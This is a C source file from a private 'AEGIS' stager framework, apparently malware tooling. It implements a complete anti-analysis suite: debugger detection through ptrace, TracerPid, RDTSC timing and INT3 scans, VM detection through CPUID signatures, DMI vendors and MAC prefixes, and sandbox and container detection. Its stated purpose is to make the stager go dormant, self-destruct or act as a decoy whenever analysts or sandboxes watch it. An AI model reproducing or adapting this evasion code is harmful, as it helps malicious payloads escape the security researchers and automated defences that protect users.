/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Anti-Analysis Suite (Implementation)
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : stager/anti_analysis.c
 *  Purpose        : Full implementation of anti-debug, anti-VM, anti-sandbox,
 *                   and anti-container detection.  Each check is engineered
 *                   to be fast, silent, and non-obvious to reverse engineers.
 *
 *  Philosophy     : If we detect analysis, we DO NOT crash, alert, or behave
 *                   abnormally.  We simply return a failure code and let the
 *                   caller decide: go dormant, self-destruct, or run decoy
 *                   behavior.  The goal is to be indistinguishable from a
 *                   legitimate program that simply decided not to do something.
 * ============================================================================
 */

#include "anti_analysis.h"
#include "../common/config.h"

#include <cpuid.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/sysinfo.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>


/* ── Internal: RDTSC Inline ──────────────────────────────────────────────── */

static inline uint64_t rdtsc_read(void) {
  uint32_t lo, hi;
  __asm__ volatile("rdtsc" : "=a"(lo), "=d"(hi));
  return ((uint64_t)hi << 32) | lo;
}

/* ── Internal: Read file into buffer ─────────────────────────────────────── */

static ssize_t read_file_buf(const char *path, char *buf, size_t cap) {
  int fd = open(path, O_RDONLY);
  if (fd < 0)
    return -1;
  ssize_t n = read(fd, buf, cap - 1);
  close(fd);
  if (n > 0)
    buf[n] = '\0';
  return n;
}

/* ── Internal: Check if a string exists in a comma-delimited list ────────── */

static bool is_in_list(const char *name, const char *csv_list) {
  const char *p = csv_list;
  size_t name_len = strlen(name);

  while (*p) {
    const char *comma = strchr(p, ',');
    size_t seg_len = comma ? (size_t)(comma - p) : strlen(p);

    if (seg_len == name_len && strncmp(p, name, seg_len) == 0)
      return true;

    p += seg_len;
    if (*p == ',')
      p++;
  }
  return false;
}

/* ── Debugger Detection: ptrace ──────────────────────────────────────────── */

aegis_result_t aegis_aa_check_ptrace(void) {
  #ifdef AEGIS_DISABLE_AA
    return AEGIS_OK;
  #endif
  #ifndef AEGIS_AA_ENABLE_PTRACE
    return AEGIS_OK;
  #endif

  /*
   * A process can only have one tracer.  If ptrace(PTRACE_TRACEME)
   * fails, something is already attached to us.
   *
   * We use a fork()+ptrace pattern to avoid disrupting our own
   * process state — the child does the TRACEME test and reports back.
   */
  pid_t child = fork();
  if (child < 0)
    return AEGIS_ERR_SYSCALL;

  if (child == 0) {
    /* Child: attempt to ptrace self */
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0)
      _exit(1); /* Being traced */
    _exit(0);   /* Clean */
  }

  int status;
  waitpid(child, &status, 0);

  if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
    return AEGIS_OK;

  return AEGIS_ERR_ANTIANALYSIS;
}

/* ── Debugger Detection: TracerPid ───────────────────────────────────────── */

aegis_result_t aegis_aa_check_tracer_pid(void) {
  #ifdef AEGIS_DISABLE_AA
    return AEGIS_OK;
  #endif
  #ifndef AEGIS_AA_ENABLE_TRACER_PID
    return AEGIS_OK;
  #endif

  char buf[4096];
  if (read_file_buf("/proc/self/status", buf, sizeof(buf)) < 0)
    return AEGIS_OK; /* Can't read = can't check, assume clean */

  const char *tracer = strstr(buf, "TracerPid:");
  if (!tracer)
    return AEGIS_OK;

  int pid = 0;
  sscanf(tracer, "TracerPid:\t%d", &pid);

  return (pid == 0) ? AEGIS_OK : AEGIS_ERR_ANTIANALYSIS;
}

/* ── Timing: RDTSC Gap ───────────────────────────────────────────────────── */

aegis_result_t aegis_aa_check_rdtsc_timing(void) {
  #ifdef AEGIS_DISABLE_AA
    return AEGIS_OK;
  #endif
  #ifndef AEGIS_AA_ENABLE_RDTSC
    return AEGIS_OK;
  #endif

  /*
   * When running under a debugger or single-stepping, the cycle count
   * between two RDTSC instructions will be abnormally high due to
   * breakpoint handling and context switches.
   *
   * Normal: ~50-200 cycles.  Debugger: >>1M cycles.
   */
  uint64_t start = rdtsc_read();

  /* Insignificant computation to prevent compiler optimization */
  volatile int x = 0;
  for (int i = 0; i < 100; i++)
    x += i;

  uint64_t end = rdtsc_read();
  uint64_t delta = end - start;

  return (delta < AEGIS_AA_RDTSC_THRESHOLD) ? AEGIS_OK : AEGIS_ERR_ANTIANALYSIS;
}

/* ── Timing: Sleep Acceleration ──────────────────────────────────────────── */

aegis_result_t aegis_aa_check_sleep_timing(void) {
  #ifdef AEGIS_DISABLE_AA
    return AEGIS_OK;
  #endif
  #ifndef AEGIS_AA_ENABLE_SLEEP_TIMING
    return AEGIS_OK;
  #endif

  /*
   * Sandboxes often accelerate time to make malware "detonate" faster.
   * We sleep for a known duration and check whether wall-clock time
   * advanced by approximately that much.
   */
  struct timespec before, after;
  clock_gettime(CLOCK_MONOTONIC, &before);

  struct timespec sleep_ts = {.tv_sec = AEGIS_AA_SLEEP_CHECK_MS / 1000,
                              .tv_nsec =
                                  (AEGIS_AA_SLEEP_CHECK_MS % 1000) * 1000000L};
  nanosleep(&sleep_ts, NULL);

  clock_gettime(CLOCK_MONOTONIC, &after);

  uint64_t elapsed_ms = (uint64_t)(after.tv_sec - before.tv_sec) * 1000 +
                        (uint64_t)(after.tv_nsec - before.tv_nsec) / 1000000;

  /* If elapsed time is way less than expected, time is being accelerated */
  if (elapsed_ms < (uint64_t)(AEGIS_AA_SLEEP_CHECK_MS / 2))
    return AEGIS_ERR_SANDBOX;

  /* If elapsed time is way more than expected, something is intercepting */
  if (elapsed_ms > (uint64_t)AEGIS_AA_SLEEP_TOLERANCE_MS * 3)
    return AEGIS_ERR_ANTIANALYSIS;

  return AEGIS_OK;
}

/* ── Hostile Process Scanning ────────────────────────────────────────────── */

aegis_result_t aegis_aa_check_hostile_procs(void) {
  #ifdef AEGIS_DISABLE_AA
    return AEGIS_OK;
  #endif
  #ifndef AEGIS_AA_ENABLE_HOSTILE_PROCS
    return AEGIS_OK;
  #endif

  DIR *proc_dir = opendir("/proc");
  if (!proc_dir)
    return AEGIS_OK; /* Can't scan, assume clean */

  struct dirent *entry;
  while ((entry = readdir(proc_dir)) != NULL) {
    /* Only look at numeric directories (PIDs) */
    if (entry->d_name[0] < '0' || entry->d_name[0] > '9')
      continue;

    char comm_path[300];
    snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", entry->d_name);

    char comm[256] = {0};
    if (read_file_buf(comm_path, comm, sizeof(comm)) < 0)
      continue;

    /* Strip trailing newline */
    char *nl = strchr(comm, '\n');
    if (nl)
      *nl = '\0';

    if (is_in_list(comm, AEGIS_AA_PROC_BLACKLIST)) {
      closedir(proc_dir);
      return AEGIS_ERR_ANTIANALYSIS;
    }
  }

  closedir(proc_dir);
  return AEGIS_OK;
}

/* ── VM Detection: CPUID ─────────────────────────────────────────────────── */

aegis_result_t aegis_aa_check_vm(void) {
  #ifdef AEGIS_DISABLE_AA
    return AEGIS_OK;
  #endif
  #ifndef AEGIS_AA_ENABLE_VM_CPUID
    return AEGIS_OK;
  #endif

  /*
   * CPUID leaf 0x1, ECX bit 31 = hypervisor present bit.
   * This is the canonical way to detect virtualization.
   *
   * Additionally, check CPUID leaf 0x40000000 for hypervisor
   * identification strings.
   */
  uint32_t eax, ebx, ecx, edx;

  /* Check hypervisor present bit */
  __cpuid(1, eax, ebx, ecx, edx);
  if (ecx & (1 << 31)) {
    /* Hypervisor detected — check which one */
    __cpuid(0x40000000, eax, ebx, ecx, edx);

    /* Known hypervisor signatures */
    char hv_id[13] = {0};
    memcpy(hv_id, &ebx, 4);
    memcpy(hv_id + 4, &ecx, 4);
    memcpy(hv_id + 8, &edx, 4);

    /* VMware: "VMwareVMware", VBox: "VBoxVBoxVBox", etc. */
    const char *known_hvs[] = {"VMwareVMware",
                               "VBoxVBoxVBox",
                               "XenVMMXenVMM",
                               "Microsoft Hv",
                               "KVMKVMKVM\0\0\0",
                               "prl hyperv", /* Parallels */
                               NULL};

    for (int i = 0; known_hvs[i]; i++) {
      if (memcmp(hv_id, known_hvs[i], 12) == 0)
        return AEGIS_ERR_SANDBOX;
    }
  }

  /* Additional check: DMI/SMBIOS strings in /sys */
  char vendor[256] = {0};
  if (read_file_buf("/sys/class/dmi/id/sys_vendor", vendor, sizeof(vendor)) >
      0) {
    const char *vm_vendors[] = {"VMware",    "VirtualBox",
                                "QEMU",      "Xen",
                                "Parallels", "Microsoft Corporation",
                                "innotek",   NULL};
    for (int i = 0; vm_vendors[i]; i++) {
      if (strstr(vendor, vm_vendors[i]))
        return AEGIS_ERR_SANDBOX;
    }
  }

  return AEGIS_OK;
}

/* ── VM Detection: MAC Address OUI ───────────────────────────────────────── */

aegis_result_t aegis_aa_check_vm_mac(void) {
  #ifdef AEGIS_DISABLE_AA
    return AEGIS_OK;
  #endif
  #ifndef AEGIS_AA_ENABLE_VM_MAC
    return AEGIS_OK;
  #endif

  int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd < 0)
    return AEGIS_OK;

  /* Enumerate network interfaces */
  const char *ifaces[] = {"eth0",   "ens33", "ens160", "enp0s3",
                          "enp0s8", "ens3",  NULL};

  for (int i = 0; ifaces[i]; i++) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifaces[i], IFNAMSIZ - 1);

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0)
      continue;

    /* Format MAC OUI (first 3 octets) */
    unsigned char *mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
    char oui[9];
    snprintf(oui, sizeof(oui), "%02X:%02X:%02X", mac[0], mac[1], mac[2]);

    /* Check against known VM OUI prefixes */
    if (is_in_list(oui, AEGIS_AA_VM_MAC_PREFIXES)) {
      close(sockfd);
      return AEGIS_ERR_SANDBOX;
    }
  }

  close(sockfd);
  return AEGIS_OK;
}

/* ── Sandbox: Resource Check ─────────────────────────────────────────────── */

aegis_result_t aegis_aa_check_sandbox_resources(void) {
  #ifdef AEGIS_DISABLE_AA
    return AEGIS_OK;
  #endif
  #ifndef AEGIS_AA_ENABLE_SANDBOX_RESOURCES
    return AEGIS_OK;
  #endif

  /* CPU cores */
  long cores = sysconf(_SC_NPROCESSORS_ONLN);
  if (cores > 0 && cores < AEGIS_AA_MIN_CPU_CORES)
    return AEGIS_ERR_SANDBOX;

  /* RAM */
  struct sysinfo si;
  if (sysinfo(&si) == 0) {
    uint64_t total_mb = (si.totalram * si.mem_unit) / (1024 * 1024);
    if (total_mb < AEGIS_AA_MIN_RAM_MB)
      return AEGIS_ERR_SANDBOX;
  }

  /* Disk space */
  char buf[256];
  FILE *f = popen("df / --output=size -B G 2>/dev/null | tail -1", "r");
  if (f) {
    if (fgets(buf, sizeof(buf), f)) {
      long disk_gb = strtol(buf, NULL, 10);
      if (disk_gb > 0 && disk_gb < AEGIS_AA_MIN_DISK_GB) {
        pclose(f);
        return AEGIS_ERR_SANDBOX;
      }
    }
    pclose(f);
  }

  return AEGIS_OK;
}

/* ── Container Detection ─────────────────────────────────────────────────── */

aegis_result_t aegis_aa_check_container(void) {
  #ifdef AEGIS_DISABLE_AA
    return AEGIS_OK;
  #endif
  #ifndef AEGIS_AA_ENABLE_CONTAINER
    return AEGIS_OK;
  #endif

  /* Check for /.dockerenv */
  if (access("/.dockerenv", F_OK) == 0)
    return AEGIS_ERR_SANDBOX;

  /* Check for container-specific cgroup entries */
  char cgroup[4096];
  if (read_file_buf("/proc/1/cgroup", cgroup, sizeof(cgroup)) > 0) {
    if (strstr(cgroup, "docker") || strstr(cgroup, "lxc") ||
        strstr(cgroup, "kubepods") || strstr(cgroup, "containerd"))
      return AEGIS_ERR_SANDBOX;
  }

  /* Check for container runtime environment variables */
  if (getenv("container") || getenv("KUBERNETES_SERVICE_HOST"))
    return AEGIS_ERR_SANDBOX;

  return AEGIS_OK;
}

/* ── Breakpoint Detection ────────────────────────────────────────────────── */

aegis_result_t aegis_aa_check_breakpoints(void *code_start, size_t code_len) {
  #ifdef AEGIS_DISABLE_AA
    return AEGIS_OK;
  #endif
  #ifndef AEGIS_AA_ENABLE_BREAKPOINTS
    return AEGIS_OK;
  #endif

  if (!code_start || code_len == 0)
    return AEGIS_OK;

  /*
   * Scan for INT3 (0xCC) instructions in our own code segment.
   * A debugger inserts these to set software breakpoints.
   *
   * We do a probabilistic scan of random offsets to avoid being
   * predictable to a patcher.
   */
  const uint8_t *code = (const uint8_t *)code_start;

  for (size_t i = 0; i < code_len; i++) {
    if (code[i] == 0xCC) {
      /* Found a breakpoint — but verify it's not a legitimate
       * INT3 in the original binary by checking context */
      if (i > 0 && code[i - 1] != 0xEB && code[i - 1] != 0xE9)
        return AEGIS_ERR_ANTIANALYSIS;
    }
  }

  return AEGIS_OK;
}

/* ── System Uptime ───────────────────────────────────────────────────────── */

aegis_result_t aegis_aa_check_uptime(void) {
  #ifdef AEGIS_DISABLE_AA
    return AEGIS_OK;
  #endif
  #ifndef AEGIS_AA_ENABLE_UPTIME
    return AEGIS_OK;
  #endif

  struct sysinfo si;
  if (sysinfo(&si) != 0)
    return AEGIS_OK;

  if (si.uptime < AEGIS_AA_MIN_UPTIME_SEC)
    return AEGIS_ERR_SANDBOX;

  return AEGIS_OK;
}

/* ── LD_PRELOAD Detection ────────────────────────────────────────────────── */

aegis_result_t aegis_aa_check_ld_preload(void) {
  #ifdef AEGIS_DISABLE_AA
    return AEGIS_OK;
  #endif
  #ifndef AEGIS_AA_ENABLE_LD_PRELOAD
    return AEGIS_OK;
  #endif

  /*
   * If LD_PRELOAD is set and we didn't set it, someone may be
   * hooking our library calls.
   */
  const char *preload = getenv("LD_PRELOAD");
  if (preload && strlen(preload) > 0) {
    /* Check if it's one of ours (nexus_auditor) — if so, ignore */
    if (!strstr(preload, AEGIS_AUDITOR_FILENAME))
      return AEGIS_ERR_ANTIANALYSIS;
  }

  /* Also check /etc/ld.so.preload */
  if (access("/etc/ld.so.preload", F_OK) == 0) {
    char buf[4096];
    if (read_file_buf("/etc/ld.so.preload", buf, sizeof(buf)) > 0) {
      if (!strstr(buf, AEGIS_AUDITOR_FILENAME) && strlen(buf) > 1)
        return AEGIS_ERR_ANTIANALYSIS;
    }
  }

  return AEGIS_OK;
}

/* ── Full Battery ────────────────────────────────────────────────────────── */

aegis_result_t aegis_aa_full_check(void) {
  /*
   * Run all checks in a deliberate order:
   * 1. Fastest checks first (timing-based)
   * 2. Passive checks (file reads)
   * 3. Active checks (ptrace, network)
   *
   * Short-circuit on first failure.
   */

  #ifdef AEGIS_DISABLE_AA
    return AEGIS_OK;
  #endif

  aegis_result_t rc;

  /* Phase 1: Timing gates */
  rc = aegis_aa_check_rdtsc_timing();
  if (rc != AEGIS_OK)
    return rc;

  rc = aegis_aa_check_sleep_timing();
  if (rc != AEGIS_OK)
    return rc;

  /* Phase 2: Passive introspection */
  rc = aegis_aa_check_tracer_pid();
  if (rc != AEGIS_OK)
    return rc;

  rc = aegis_aa_check_hostile_procs();
  if (rc != AEGIS_OK)
    return rc;

  rc = aegis_aa_check_ld_preload();
  if (rc != AEGIS_OK)
    return rc;

  rc = aegis_aa_check_uptime();
  if (rc != AEGIS_OK)
    return rc;

  /* Phase 3: VM/Sandbox/Container detection */
  rc = aegis_aa_check_vm();
  if (rc != AEGIS_OK)
    return rc;

  rc = aegis_aa_check_vm_mac();
  if (rc != AEGIS_OK)
    return rc;

  rc = aegis_aa_check_sandbox_resources();
  if (rc != AEGIS_OK)
    return rc;

  rc = aegis_aa_check_container();
  if (rc != AEGIS_OK)
    return rc;

  /* Phase 4: Active probe */
  rc = aegis_aa_check_ptrace();
  if (rc != AEGIS_OK)
    return rc;

  return AEGIS_OK;
}
